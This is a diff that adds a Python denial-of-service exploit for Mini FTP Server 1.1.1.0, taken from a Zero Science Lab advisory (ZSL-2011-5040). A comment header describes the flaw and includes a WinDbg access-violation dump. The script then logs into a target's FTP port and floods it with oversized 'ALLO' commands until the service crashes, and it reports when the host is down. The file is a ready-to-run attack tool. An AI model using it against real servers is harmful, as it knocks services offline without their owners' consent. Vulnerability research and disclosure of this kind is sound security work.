@@ -1,0 +1,104 @@
+#!/usr/bin/python
+#
+#
+# Mini FTP Server 1.1 Buffer Corruption Remote Denial Of Service Exploit
+#
+#
+# Vendor: webmaster442
+# Product web page: http://miniftpserver.codeplex.com
+# Affected version: 1.1.1.0
+#
+# Summary: Minimal FTP server for windows. Uses only managed code. Works
+# with Total commander.
+#
+# Desc: MiniFTPServer suffers from a denial of service vulnerability
+# when passing large number of bytes after authentication, resulting
+# in a crash. No need for a valid FTP command to exploit this issue.
+#
+# Tested on: Microsoft Windows XP Professional SP3 (EN)
+#
+# -----------------------------------------------------------------
+#
+# (1540.918): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00e4f900 ebx=00000000 ecx=00000000 edx=00f163e8 esi=00e4f900 edi=055ef384
+# eip=031187d3 esp=055ef154 ebp=055ef394 iopl=0         nv up ei pl zr na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+# 031187d3 3909            cmp     dword ptr [ecx],ecx  ds:0023:00000000=????????
+# 0:011> d edx
+# 00f163e8  80 6a 9f 7a 28 f9 c5 00-00 00 00 00 64 f1 dc 00  .j.z(.......d...
+# 00f163f8  54 72 f1 00 00 00 00 00-00 00 00 00 01 00 00 80  Tr..............
+# 00f16408  00 00 00 00 4c 64 f1 00-00 00 00 00 00 00 00 00  ....Ld..........
+# 00f16418  18 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+# 00f16428  b0 f1 dc 00 01 00 00 00-00 00 00 00 00 00 00 00  ................
+# 00f16438  00 00 00 00 00 00 00 00-f4 01 00 00 50 f9 e4 00  ............P...
+# 00f16448  00 00 00 00 68 b4 b9 79-00 00 00 00 70 64 f1 00  ....h..y....pd..
+# 00f16458  00 00 00 00 00 00 00 00-00 00 00 00 80 72 f1 00  .............r..
+# 0:011> d
+# 00f16468  00 00 00 00 00 00 00 00-f0 b0 5c 7b 00 00 00 00  ..........\{....
+# 00f16478  80 9f b9 00 84 64 f1 00-00 00 01 00 60 9e b9 79  .....d......`..y
+# 00f16488  c4 1a a0 00 00 00 00 00-00 00 00 00 ac f9 b9 79  ...............y
+# 00f16498  f4 01 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.
+# 00f164a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 00f164b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 00f164c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 00f164d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#
+# -----------------------------------------------------------------
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# liquidworm gmail com
+# Zero Science Lab - http://www.zeroscience.mk
+#
+#
+# Advisory ID: ZSL-2011-5040
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5040.php
+#
+#
+# 28.08.2011
+#
+
+import socket, sys
+  
+if len(sys.argv) < 2:
+	print ("\n===============================================")
+	print ("\nMini FTP Server 1.1 Remote DoS Exploit\n")
+	print ("Zero Science Lab - http://www.zeroscience.mk")
+	print ("\nID: ZSL-2011-5040")
+	print ("\n===============================================")
+	print ("\n - Usage: "+ sys.argv[0] +" [hostname]\n")
+	sys.exit(0)
+
+host = (sys.argv[1])
+data = ("A@" * 50000) #Any char and combination would do
+cmd = ('ALLO') #Any CMD would do, or no CMD at all
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print ("\r\n[+] Attacking: " + host +"\r\n")
+print ("[*] Please be patient...\r\n")
+
+try:
+	s.connect((host, 21))
+	r=s.recv(1024)
+	print (r)
+	s.send("USER username\r\n")
+	r=s.recv(1024)
+	print (r)
+	s.send("PASS password\r\n")
+	r=s.recv(1024)
+	print (r)
+	s.send(cmd + " " + data + '\r\n')
+	r=s.recv(1024)
+	print (r)
+	print ("[*] Please be patient...\r\n")
+	for x in range(0,10): s.send(cmd + " " + data + '\r\n')
+	r=s.recv(1024)
+	print (r)
+	s.close()
+
+	try: s.connect((host,21))
+	except:	print ("\r\n[*] Host is down!")
+
+except:	print ("[*] Oops!")
